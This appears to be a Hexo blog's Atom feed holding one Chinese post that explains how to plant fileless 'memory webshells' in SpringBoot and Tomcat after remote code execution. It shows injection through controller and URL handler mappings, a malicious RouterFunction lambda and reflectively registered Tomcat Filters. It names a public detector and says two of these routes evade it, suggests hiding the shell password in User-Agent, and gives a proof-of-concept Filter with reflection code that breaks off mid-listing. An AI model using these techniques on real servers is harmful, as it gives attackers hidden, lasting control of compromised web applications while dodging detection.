<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xiaopan233 Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-07T16:16:49.218Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Xiaopan233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomcat内存马</title>
    <link href="http://example.com/2022/07/07/2022-07-07-java-memory-shell/"/>
    <id>http://example.com/2022/07/07/2022-07-07-java-memory-shell/</id>
    <published>2022-07-07T15:24:02.000Z</published>
    <updated>2022-07-07T16:16:49.218Z</updated>
    
    <content type="html"><![CDATA[<p>本文写的很垃圾，建议学过基本的之后，当笔记看就好了。本文写了点可能比较新奇的东西。</p><p>想认真学的还是去看文末的Ref吧。</p><p><strong>前提：和回显类似。得先RCE</strong></p><p><strong>好处：规避静态文件的查杀</strong></p><p><strong>原理：</strong>Java Web不像apache + php模式，每一次请求都是生成新的php实例。Java Web是长期运行的（同理的还有.net、go、python这些）。Web程序必定会有相关的变量、逻辑进行请求分发的操作。当我们RCE之后，若能控制进行请求分发的变量，便能控制请求分发的逻辑。</p><p>常见的操作有：新增控制器、修改控制器、添加拦截器等</p><span id="more"></span><p><strong>步骤</strong>：</p><ol><li>构造恶意类</li><li>获取上下文对象</li><li>拿到Filter、Servlet这些东西的注册类</li><li>往注册类里注册恶意类</li></ol><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>本例环境为：SpringBoot2.6.1</p><h1 id="获取上下文对象"><a href="#获取上下文对象" class="headerlink" title="获取上下文对象"></a>获取上下文对象</h1><p>上下文对象中存放了大量的bean。大部分是Spring运行依赖的类对象。拿到这些bean。相当于成功了一半。</p><p><strong>getAttribute方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">HttpServletRequest httpServletRequest = requestAttributes.getRequest();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存储WebApplicationContext的属性</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.DispatcherServlet.CONTEXT</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes1 = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();</span><br><span class="line">ServletContext servletContext1 = requestAttributes1.getRequest().getServletContext();</span><br><span class="line">(WebApplicationContext)servletContext1.getAttribute(XXXX);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存储WebApplicationContext的属性</span></span><br><span class="line"><span class="comment">org.springframework.web.context.WebApplicationContext.ROOT</span></span><br><span class="line"><span class="comment">org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcherServlet</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>WebApplicationContextUtils方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();</span><br><span class="line">HttpServletRequest request = requestAttributes.getRequest();</span><br><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">WebApplicationContext webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(servletContext);</span><br></pre></td></tr></table></figure><p><strong>ContextLoader方式</strong></p><p><em>这个我在SpringBoot里用，返回的是Null。。。。</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext currentWebApplicationContext = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p><strong>注意事项：</strong></p><p>以上拿到的WebApplicationContext都是<code>AnnotationConfigServletWebServerApplicationContext</code>的实例</p><p>但是，<code>getBeanFactory()</code>在<code>GenericApplicationContext</code>类中。所以要类型转换一下。</p><p><strong>关于IOC</strong></p><p>Spring IOC容器（BeanFactory）中，Bean对象存放的方式为：</p><p>获取属性的操作在：<em>DefaultListableBeanFactory#getBean</em></p><p>实际属性的位置在：<em>DefaultSingletonBeanRegistry.singletonObjects</em></p><h1 id="手动注册Controller"><a href="#手动注册Controller" class="headerlink" title="手动注册Controller"></a>手动注册Controller</h1><p>从源码角度看：请求分发入口 <em>DispatcherServlet#doDispatch</em></p><p>关键操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">processedRequest = checkMultipart(request); <span class="comment">//组装请求为Multipart</span></span><br><span class="line"></span><br><span class="line">mappedHandler = getHandler(processedRequest); <span class="comment">//从IOC中找bean[!]</span></span><br><span class="line"></span><br><span class="line">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler()); <span class="comment">//实际调用Controller</span></span><br></pre></td></tr></table></figure><h3 id="getHandler-方法"><a href="#getHandler-方法" class="headerlink" title="getHandler()方法"></a><code>getHandler()</code>方法</h3><p><strong><code>getHandler()</code><strong>是比较重要的方法。主要逻辑是根据请求url，找对应的处理器，也就是</strong>HandlerMapping</strong>的适配。</p><p><code>HandlerMapping</code>如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingHandlerMapping</span><br><span class="line">BeanNameUrlHandlerMapping</span><br><span class="line">RouterFunctionMapping</span><br><span class="line">SimpleUrlHandlerMapping</span><br><span class="line">WelcomePageHandlerMapping</span><br></pre></td></tr></table></figure><p><code>HandlerMapping#getHandler()</code> <strong>会调用</strong><code>AbstractHandlerMapping#getHandlerInternal()</code>。对于这个方法的实现。有可分为三个抽象类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping</span><br><span class="line">RequestMappingHandlerMapping</span><br><span class="line">    </span><br><span class="line">AbstractUrlHandlerMapping</span><br><span class="line">    BeanNameUrlHandlerMapping</span><br><span class="line">    SimpleUrlHandlerMapping</span><br><span class="line">    WelcomePageHandlerMapping</span><br><span class="line">    </span><br><span class="line">RouterFunctionMapping</span><br><span class="line">    根据<span class="keyword">this</span>.routerFunction.route() 返回HandlerFunction</span><br><span class="line">    <span class="comment">//有好多lambda。可以当一个难检测🐎？</span></span><br></pre></td></tr></table></figure><p>深究后可以发现，前两个抽象类都存在着<strong>路由映射</strong>属性。而<code>RouterFunctionMapping</code>比较特殊，后文说。</p><p><code>AbstractHandlerMethodMapping</code>和<code>AbstractUrlHandlerMapping</code>大同小异。只是最后的映射Map不一样而已。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AbstractHandlerMethodMapping</span></span><br><span class="line"><span class="comment">//Map名为mappingRegistry</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> HandlerMethod <span class="title">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span></span>&#123;</span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="keyword">this</span>.mappingRegistry.getMappingsByDirectPath(lookupPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AbstractUrlHandlerMapping</span></span><br><span class="line"><span class="comment">//Map名为handlerMap</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getDirectMatch</span><span class="params">(String urlPath, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    Object handler = <span class="keyword">this</span>.handlerMap.get(urlPath);</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入马的思路：操作路由映射的Map。控制程序的路由走向。将路由<strong>映射</strong>到恶意类的恶意方法中</p><p>那马为什么要加<strong>内存</strong>二字呢？因为我们可以通过<code>defineClass()</code>，直接将字节码还原成对象实例。无文件落地。</p><p>找Map赋值位置的思路：找到Map变量，搜索赋值点。最终找到这两个方法，对于上文的两个抽象类。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractHandlerMethodMapping$MappingRegistry#register(T mapping, Object handler, Method method)</span><br><span class="line">AbstractUrlHandlerMapping#registerHandler(String urlPath, Object handler)</span><br></pre></td></tr></table></figure><p>那接下来简单了。<strong>调用这两接口</strong>。就可以注册任意的<strong>路由映射</strong>了。</p><h2 id="AbstractHandlerMethodMapping注册内存马"><a href="#AbstractHandlerMethodMapping注册内存马" class="headerlink" title="AbstractHandlerMethodMapping注册内存马"></a><code>AbstractHandlerMethodMapping</code>注册内存马</h2><p><em>AbstractHandlerMethodMapping</em>的注册固然可以使用<code>registerMapping()</code>。但是他会记录一个logger。不优雅</p><p><em>AbstractHandlerMethodMapping#registerMapping</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(T mapping, Object handler, Method method)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="comment">//记录日志操作</span></span><br><span class="line">        logger.trace(<span class="string">&quot;Register \&quot;&quot;</span> + mapping + <span class="string">&quot;\&quot; to &quot;</span> + method.toGenericString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用<code>this.mappingRegistry.register</code>，更直接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(T mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure><p>具体的参数和类型，我们可以参考其子类。也就是<code>RequestMappingHandlerMapping#registerMapping</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerMapping</span><span class="params">(RequestMappingInfo mapping, Object handler, Method method)</span></span></span><br></pre></td></tr></table></figure><p>看看正常的controller。其<code>RequestMappingInfo</code>长啥样。可以在<code>AbstractHandlerMethodMapping#addMatchingMappings</code>看到。</p><p><img src="/2022/07/07/2022-07-07-java-memory-shell/3.png"></p><p><code>RequestMappingInfo</code>中设置了<code>pathPatternsCondition</code>的值。仿着写，就对了。如果<code>patternsCondition</code>设置了值，会有一个坑：SpringMVC在 <em>AbstractHandlerMapping#initLookupPath</em>中，移除了<code>UrlPathHelper.PATH_ATTRIBUTE</code>属性。但是在<code>UrlPathHelper#getResolvedLookupPath</code>又拿了一次<code>UrlPathHelper.PATH_ATTRIBUTE</code>属性。会被<code>Assert.notNull()</code>终止。</p><p>为了避坑，还是仿着正常格式来构造吧。</p><h2 id="AbstractUrlHandlerMapping注册内存马"><a href="#AbstractUrlHandlerMapping注册内存马" class="headerlink" title="AbstractUrlHandlerMapping注册内存马"></a><code>AbstractUrlHandlerMapping</code>注册内存马</h2><p>比<code>AbstractHandlerMethodMapping</code>注册还简单。看到他的注册方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">registerHandler</span><span class="params">(String urlPath, Object handler)</span></span></span><br></pre></td></tr></table></figure><p>没啥难的，</p><h2 id="RouterFunctionMapping注册内存马"><a href="#RouterFunctionMapping注册内存马" class="headerlink" title="RouterFunctionMapping注册内存马"></a><code>RouterFunctionMapping</code>注册内存马</h2><p><strong>十分危险。<code>RouterFunctionMapping</code>只有一个<code>routerFunction</code>，普通的SpringBoot项目这个属性是null，但如果攻击的程序有使用<code>RouterFunctionMapping</code>，很可能会崩</strong></p><p>看下<code>RouterFunctionMapping#getHandlerInternal</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getHandlerInternal</span><span class="params">(HttpServletRequest servletRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.routerFunction != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//[!]调用this.routerFunction.route()</span></span><br><span class="line">        HandlerFunction&lt;?&gt; handlerFunction = <span class="keyword">this</span>.routerFunction.route(request).orElse(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找<code>RouterFunctionMapping</code>的继承类，找到一个<code>RouterFunctions$ResourcesRouterFunction</code></p><p>该类有个<code>Function lookupFunction</code>属性。可以存放lambda。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourcesRouterFunction</span> <span class="keyword">extends</span>  <span class="title">AbstractRouterFunction</span>&lt;<span class="title">ServerResponse</span>&gt; </span>&#123;</span><br><span class="line"><span class="comment">//[!]</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ResourcesRouterFunction</span><span class="params">(Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction)</span> </span>&#123;</span><br><span class="line">Assert.notNull(lookupFunction, <span class="string">&quot;Function must not be null&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.lookupFunction = lookupFunction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 会被调用的route()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Optional&lt;HandlerFunction&lt;ServerResponse&gt;&gt; route(ServerRequest request) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.lookupFunction.apply(request).map(ResourceHandlerFunction::<span class="keyword">new</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>是不是我们可以在自定义个<strong>恶意</strong>的lambda类呢？<strong>是的，完全可以。</strong></p><p>实测是能用的。</p><h1 id="关于内存马检测"><a href="#关于内存马检测" class="headerlink" title="关于内存马检测"></a>关于内存马检测</h1><p>看了下4ra1n师傅的检测。似乎只检测了<code>RequestMappingHandlerMapping</code>里的<code>mappingRegistry</code> - <strong>2021.12.06</strong></p><p><a href="https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java">https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java</a></p><p>那我们可以通过注入<code>AbstractUrlHandlerMapping</code>和<code>RouterFunctionMapping</code>内存马即可规避检测</p><h1 id="隐蔽方式"><a href="#隐蔽方式" class="headerlink" title="隐蔽方式"></a>隐蔽方式</h1><p>把password放在User-Agent上</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>参考三梦师傅的文。（看文，好像师傅本来想通过注册一个优先级最高的Filter，来绕过Filter加载顺序拿不到response的问题，达到回显的效果。但，要注册Filter的前提是得拿到一个response。这就无了。所以，把他改成无文件内存马，更佳）</p><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h3 id="注册Filter"><a href="#注册Filter" class="headerlink" title="注册Filter"></a>注册Filter</h3><p>在Tomcat运行状态下，直接<code>addFilter()</code>是不得行的。会报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Filters can not be added to context /tomcat1_war_exploded as the context has been initialised</span><br></pre></td></tr></table></figure><p>跟进去报错的调用栈。发现抛错代码如下，十分简单粗暴</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.<span class="function">Dynamic <span class="title">addFilter</span><span class="params">(String filterName,</span></span></span><br><span class="line"><span class="function"><span class="params">            String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        <span class="comment">//TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                         getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么动态注册Filter的思路也很明显了：反射修改<code>context.getState()</code>的值，让其值为<code>LifecycleState.STARTING_PREP</code>。就可以正常执行<code>addFilter()</code>的逻辑了</p><p>反射路径:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ApplicationContext.context</span><br><span class="line">    LifecycleBase.state</span><br></pre></td></tr></table></figure><p><strong>添加Filter的程序逻辑</strong></p><p>这样添加好Filter就能用了嘛？不，并不可以。结合前面我们需要反射修改<code>LifecycleBase.state</code>可推测。添加Filter的功能本来就不是在Tomcat启动中使用的。所以，我们还得简单看一下Filter的调用逻辑，看看Tomcat是在哪里保存Filter信息，怎么调用Filter的。如果可以，我们就通过反射修改存储FIiter信息的属性。</p><p>根据调用栈可知，Tomcat是通过调用<code>ApplicationFilterChain</code>来调用每一个Filter的。<code>ApplicationFilterChain</code>之前是由<code>StandardWrapperValve#invoke()</code>调用的。我们点到<code>StandardWrapperValve#invoke()</code>里头看看</p><img src="/2022/07/07/2022-07-07-java-memory-shell/3.png" style="zoom: 100%;"><p>可以发现，对于每一个请求，Tomcat都会在<code>StandardWrapperValve#invoke()</code>中新建一个<code>ApplicationFilterChain</code>来执行Filter chain操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">    <span class="comment">//拿到filterChain后，执行doFilter()走Filter流程</span></span><br><span class="line">    filterChain.doFilter(request.getRequest(), response.getResponse());</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看进新建的<code>ApplicationFilterFactory.createFilterChain()</code>，该方法依据<code>context</code>上下文变量查找对应的<code>Filter</code>。若<code>filterMap</code>在上下文中有存放，就会新建一个<code>ApplicationFilterChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title">createFilterChain</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            Wrapper wrapper, Servlet servlet)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    .....x</span><br><span class="line">    <span class="comment">//filterMaps就是上文通过addFilter()，插入的Filter信息表</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="comment">//调用的Filter在上下文中不存在，就不会存入filterChain中，也就不会返回该filter了</span></span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">            context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用的Filter在上下文中存在，存入filterChain</span></span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">     &#125;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Filter生效"><a href="#Filter生效" class="headerlink" title="Filter生效"></a>Filter生效</h3><p>要让Filter真正生效，需要修改<code>StandardContext.filterConfigs</code>的属性。往里头插入新增的Filter。但这个暂且没看到哪里有赋值点。目测只能手动反射，为其新增一个<code>Filter</code></p><p>在Debug中看到<code>ApplicationFilterConfig</code>的属性有点复杂，怎么构造呢？去看看源码中<code>ApplicationFilterConfig</code>是怎么被构建的，找找是否有Factory类或者create方法。找到*StandardContext#filterStart()*。发现直接new就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterConfig filterConfig =</span><br><span class="line">     <span class="keyword">new</span> ApplicationFilterConfig(<span class="keyword">this</span>, entry.getValue());</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><p>看来还需要构造多一个<code>FilterDef</code>。这个类没那么复杂，直接调用<code>setXX()</code>就可以完成属性赋值了。</p><h3 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h3><p>思路：</p><ol><li>临时修改<code>LifecycleBase.state</code>为<code>LifecycleState.STARTING_PREP</code></li><li>通过<code>ApplicationContextFacade.addFilter()</code>注册一个Filter。</li><li>注册后设置Filter，指定其匹配路径</li><li>反射修改<code>StandardContext.filterConfigs</code>，新增Filter，使前面注册的Filter生效</li><li>最后记得将<code>LifecycleBase.state</code>改回<code>LifecycleState.STARTED</code></li></ol><p>定义一个FIlter。但不在<code>web.xml</code>中配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EF</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Evil Filter Hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Servlet中动态注册Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[+] 获取需要的属性StandardContext</span></span><br><span class="line">ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) getServletContext();</span><br><span class="line">Field contextField = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) contextField.get(applicationContextFacade);</span><br><span class="line"></span><br><span class="line">Field standardContextField = ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 临时修改LifecycleBase.state</span></span><br><span class="line">Field stateFiled = LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">stateFiled.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 注册Filter</span></span><br><span class="line">Filter ef = <span class="keyword">new</span> EF();</span><br><span class="line"><span class="comment">//第一次注册就会返回FilterRegistration.Dynamic</span></span><br><span class="line">FilterRegistration.Dynamic filterRegistration = applicationContextFacade.addFilter(<span class="string">&quot;ef&quot;</span>, ef);</span><br><span class="line"><span class="comment">//参数</span></span><br><span class="line"><span class="comment">//EnumSet&lt;DispatcherType&gt;: 表示拦截类型</span></span><br><span class="line"><span class="comment">//boolean: 在所有Filter之后/之前执行</span></span><br><span class="line"><span class="comment">//String[]: 匹配url</span></span><br><span 